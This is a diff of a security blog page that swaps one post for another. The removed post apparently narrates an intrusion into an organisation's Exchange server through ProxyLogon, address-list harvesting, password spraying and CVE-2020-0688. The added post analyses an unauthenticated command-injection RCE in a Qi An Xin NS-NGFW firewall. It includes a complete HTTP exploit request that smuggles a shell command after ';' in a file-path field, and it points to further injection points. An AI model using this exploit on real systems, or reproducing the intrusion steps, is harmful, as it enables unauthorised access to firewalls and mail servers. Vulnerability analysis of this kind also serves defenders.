@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Gr3yy">
   <meta name="keywords" content="">
-  <title>一个exchange小实战 - Gr3yy&#39;s Blog</title>
+  <title>奇安信NS-NGFW防火墙前台rce分析 - Gr3yy&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -174,7 +174,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="一个exchange小实战">
+            <span class="h2" id="subtitle" title="奇安信NS-NGFW防火墙前台rce分析">
               
             </span>
 
@@ -184,8 +184,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-04-01 05:00" pubdate>
-        April 1, 2021 am
+      <time datetime="2021-04-15 17:03" pubdate>
+        April 15, 2021 pm
       </time>
     </span>
   
@@ -196,7 +196,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      822 字
+      755 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      9
        分钟
     </span>
   
@@ -236,42 +236,47 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">一个exchange小实战</h1>
+            <h1 style="display: none">奇安信NS-NGFW防火墙前台rce分析</h1>
             
             <div class="markdown-body">
-              <h1 id="一个exchange小实战"><a href="#一个exchange小实战" class="headerlink" title="一个exchange小实战"></a>一个exchange小实战</h1><p>这个目标打的有点意思，记录一下</p>
-<h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>信息收集以后发现目标开了exchange，一看版本，还挺低的。还觉得运气不错，指不定proxyLogon一发入魂。</p>
-<p><img src="/img/article2/image-20210401191331298.png" srcset="/img/loading.gif" alt="image-20210401191331298"></p>
-<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>先测了一手poc，dnslog收到了请求，漏洞存在，内心狂喜。</p>
-<p><img src="/img/article2/image-20210401192029585.png" srcset="/img/loading.gif" alt="image-20210401192029585"></p>
-<p><img src="/img/article2/image-20210401192056920.png" srcset="/img/loading.gif" alt="image-20210401192056920"></p>
-<p>但是后来才发现事情没有那么简单，对方直接给/ecp/proxyLogon.ecp这个接口给删除了…</p>
-<p>估计是因为exchange这种使用量大的服务不好随意关停，很多企业或者厂商更倾向于暴力删改漏洞点而不是升级版本。</p>
-<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>当下有点头疼，只能先换个思路，尝试从ews去读取邮件信息，看看能不能从邮件里发现些什么</p>
-<p>然后更诡异的事情发生了，读数量的地方没什么问题，可读取邮件itemid的时候，死活不能识别邮箱地址，明明用<code>&lt;t:EmailAddress&gt;&lt;/t:EmailAddress&gt;</code> 标签制定了，怎么试都不行，无奈放弃了这个想法，这个问题至今也没搞懂是为什么。</p>
-<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>邮件也读不到，很难受。于是再换一个思路，去读取GAL（全局地址列表），这次倒是成功的，通过autodiscover接口读到oaburl，然后再通过lzx地址下载lzx，最后通过工具解密，具体步骤见前面的文章。</p>
-<p><img src="/img/article2/image-20210401192949824.png" srcset="/img/loading.gif" alt="image-20210401192949824"></p>
-<p> 导出来三千个邮箱账户，就想着说不定爆破进去一个呢，0688直接起飞。于是用ebruster喷了两天，因为担心用户锁定，一天只敢喷三次，从未中奖的我结果当然也没成功。</p>
-<h2 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h2><p>就在我已经快要放弃这个点的时候，因为实在是不甘心就又看了看ews的返回包，突然发现了华点</p>
-<p><img src="/img/article2/image-20210401193347266.png" srcset="/img/loading.gif" alt="image-20210401193347266"></p>
-<p>这里显示了一个和之前两台长得完全不一样的机器名，于是我就顺手尝试了一下他</p>
-<p><img src="/img/article2/image-20210401193423797.png" srcset="/img/loading.gif" alt="image-20210401193423797"></p>
-<p>！！！！他居然没有删掉ecp的接口！！！，内心狂喜，感觉上天眷顾了我这个努力的打工人</p>
-<h2 id="一波三折"><a href="#一波三折" class="headerlink" title="一波三折"></a>一波三折</h2><p>但是这台机器在外网是访问不到的，直接写webshell肯定不行，于是我想着通过unc路径，把webshell写到外面能访问的机器上。</p>
-<p><code>\\\x.x.local\c$\Program File\exchange\xxx\v15\http\owa\auth\1.aspx</code></p>
-<p>然而事实又和我开起玩笑，对方把<code>DDI</code> 类给禁掉了。</p>
-<p><img src="/img/article2/image-20210401193903734.png" srcset="/img/loading.gif" alt="image-20210401193903734"></p>
-<p>当场人就傻了，这啥机器啊，也太灵性了。</p>
-<h2 id="有志者，事竟成"><a href="#有志者，事竟成" class="headerlink" title="有志者，事竟成"></a>有志者，事竟成</h2><p>就在我又一次陷入自闭的时候，我突然想到了他之前的版本号。15.08，这个版本应该连cve-2020-0688也没修掉。而0688的利用条件是有一个普通用户的凭证。虽然我没有用户的凭证，但是我有proxyLogon呀！！！！</p>
-<p>通过proxyLogon我可以直接拿到asp.net_session。</p>
-<p>说干就干，首先通过/ecp/proxyLogon.ecp接口通过ecp的认证，获得.net的session。</p>
-<p><img src="/img/article2/image-20210401194405162.png" srcset="/img/loading.gif" alt="image-20210401194405162"></p>
-<p>然后通过这个session直接生成0688的payload（前提是<code>generator</code> 的值是默认值），然后通过ssrf直接梭哈。</p>
-<p><img src="/img/article2/image-20210401194714081.png" srcset="/img/loading.gif" alt="image-20210401194714081"></p>
-<p><img src="/img/article2/image-20210401195145084.png" srcset="/img/loading.gif" alt="image-20210401195145084"></p>
-<p>好家伙，收到请求的时候眼泪都要流出来了。</p>
-<p>后面的操作就很常规了，没啥好说的。</p>
-<p>这个故事就是 告诉大家不要轻言放弃。</p>
+              <h1 id="奇安信NS-NGFW防火墙前台rce分析"><a href="#奇安信NS-NGFW防火墙前台rce分析" class="headerlink" title="奇安信NS-NGFW防火墙前台rce分析"></a>奇安信NS-NGFW防火墙前台rce分析</h1><p>最近hw行动愈演愈烈，漏洞也是层出不穷，之前爆出了网康防火墙的rce，就分析一下</p>
+<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>这次漏洞又是前台无条件rce，影响就还是挺大的。</p>
+<p><img src="/img/article2/image-20210414220702607.png" srcset="/img/loading.gif" alt="image-20210414220702607"></p>
+<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><h3 id="网上的poc"><a href="#网上的poc" class="headerlink" title="网上的poc"></a>网上的poc</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/directdata/direct/router</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>x.x.x.x<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=nhqa43j0v61u6mtgkskkf235q7; ys-active_page=s%3A<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>160<br><br>&#123;<br>    &quot;action&quot;: &quot;SSLVPN_Resource&quot;,<br>    &quot;method&quot;: &quot;deleteImage&quot;,<br>    &quot;data&quot;:[&#123;<br>     &quot;data&quot;:[&quot;/var/www/html/b.txt;echo&#x27;fa3a6469&#x27;&gt;/var/www/html/fa3a6.txt&quot;]<br>    &#125;],<br>    &quot;type&quot;: &quot;rpc&quot;,<br>    &quot;tid&quot;: 17<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>post请求部分如上，可以很明显的看出是一个命令注入的漏洞。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据漏洞我们就可以结合代码进行分析</p>
+<p>首先根据路由，找到 <code>/directdata/direct/router</code> 这个请求的内容</p>
+<p><img src="/img/article2/image-20210415023027400.png" srcset="/img/loading.gif" alt="image-20210415023027400"></p>
+<p>发现调用了 <code>Ext_Direct</code> 类的 <code>run</code> 方法，发现这个类的作用是直接调用模板内的方法，继续跟进</p>
+<p><img src="/img/article2/image-20210415023210498.png" srcset="/img/loading.gif" alt="image-20210415023210498"></p>
+<p>开头调用了 <code>Ext_Direct_Request</code> 类解析请求</p>
+<p><img src="/img/article2/image-20210415023755850.png" srcset="/img/loading.gif" alt="image-20210415023755850"></p>
+<p><img src="/img/article2/image-20210415023804373.png" srcset="/img/loading.gif" alt="image-20210415023804373"></p>
+<p>发现这个方法解析了请求体，他做的操作是先调用 <code>json_decode</code> 解析json，会返回一个对象，然后一次解析请求的类名、方法名、参数名。</p>
+<p><img src="/img/article2/image-20210415024006387.png" srcset="/img/loading.gif" alt="image-20210415024006387"></p>
+<p>并通过 <code>call_user_func_array</code> 调用方法，传递参数。</p>
+<p>那这个漏洞的利用就很明了， <code>DirectController.php</code> 这个控制器存在未授权的问题，导致攻击者可以利用他调用任意模板。</p>
+<p>那我们就可以对poc进行分析：</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;SSLVPN_Resource&quot;</span>,<br>    <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;deleteImage&quot;</span>,<br>    <span class="hljs-string">&quot;data&quot;</span>:[&#123;<br>     <span class="hljs-string">&quot;data&quot;</span>:[<span class="hljs-string">&quot;/var/www/html/b.txt;echo&#x27;fa3a6469&#x27;&gt;/var/www/html/fa3a6.txt&quot;</span>]<br>    &#125;]<br></code></pre></td></tr></table></figure>
+<p>这三个参数，对应着：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">类名：SSLVPN_Resource<br>方法：deleteImage<br>参数：&#123;<br>     <span class="hljs-string">&quot;data&quot;</span>:[<span class="hljs-string">&quot;/var/www/html/b.txt;echo&#x27;fa3a6469&#x27;&gt;/var/www/html/fa3a6.txt&quot;</span>]<br>    &#125; <br>    <span class="hljs-comment"># call_user_func_array使用数组传递参数</span><br>    <br></code></pre></td></tr></table></figure>
+<p>那就直接去代码中寻找就行</p>
+<p><img src="/img/article2/image-20210415024532281.png" srcset="/img/loading.gif" alt="image-20210415024532281"></p>
+<p>一目了然，参数传递的是一个对象，取 <code>data</code> 的值（数组）进行遍历后，如果遍历的值不是default.png，则将该值拼接进命令执行删除，其中未作任何过滤，直接通过 <code>;</code> 即可执行任意命令。</p>
+<h3 id="其他RCE点"><a href="#其他RCE点" class="headerlink" title="其他RCE点"></a>其他RCE点</h3><p>其实可调用的model中还有很多的rce点，比如以下这个点</p>
+<p><img src="/img/article2/image-20210415025011554.png" srcset="/img/loading.gif" alt="image-20210415025011554"></p>
+<p>利用方式更简洁明了</p>
+<p><img src="/img/article2/image-20210415025038253.png" srcset="/img/loading.gif" alt="image-20210415025038253"></p>
+<p>而且此处是回显的。</p>
+<p>又比如</p>
+<p><img src="/img/article2/image-20210415025132254.png" srcset="/img/loading.gif" alt="image-20210415025132254"></p>
+<p>这里，对于linux系统来说建立文件夹的名称是可以包含特殊字符的</p>
+<p><img src="/img/article2/image-20210415025243740.png" srcset="/img/loading.gif" alt="image-20210415025243740"></p>
+<p>这样的话其实对他们执行命令时需要通过转义符进行转义，比如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm -rf 1\;2<br></code></pre></td></tr></table></figure>
+<p>但是这个代码里明显没有，这个exec_cmd是执行环境变量 <code>CMD</code> 的值，所以这里又是一处命令注入点</p>
+<p><img src="/img/article2/image-20210415025521207.png" srcset="/img/loading.gif" alt="image-20210415025521207"></p>
+<p>应该还有很多地方把，不一个个挖了。。</p>
 
             </div>
             <hr>
@@ -281,7 +286,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/AD/">AD</a>
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
                     
                   </div>
                 
@@ -289,11 +294,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/AD/">AD</a>
+                      <a class="hover-with-bg" href="/tags/Exp/">Exp</a>
                     
-                      <a class="hover-with-bg" href="/tags/Exchange/">Exchange</a>
-                    
-                      <a class="hover-with-bg" href="/tags/Real/">Real</a>
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
                     
                   </div>
                 
@@ -306,18 +309,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/04/15/%E5%A5%87%E5%AE%89%E4%BF%A1NS-NGFW%E9%98%B2%E7%81%AB%E5%A2%99%E5%89%8D%E5%8F%B0rce%E5%88%86%E6%9E%90/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">奇安信NS-NGFW防火墙前台rce分析</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/03/20/exchange_ssrf/">
-                        <span class="hidden-mobile">CVE-2021–26855 & CVE-2021–27065（ProxyLogon）分析</span>
+                      <a href="/2021/04/01/%E4%B8%80%E4%B8%AAexch%E5%B0%8F%E5%AE%9E%E6%88%98/">
+                        <span class="hidden-mobile">一个exchange小实战</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
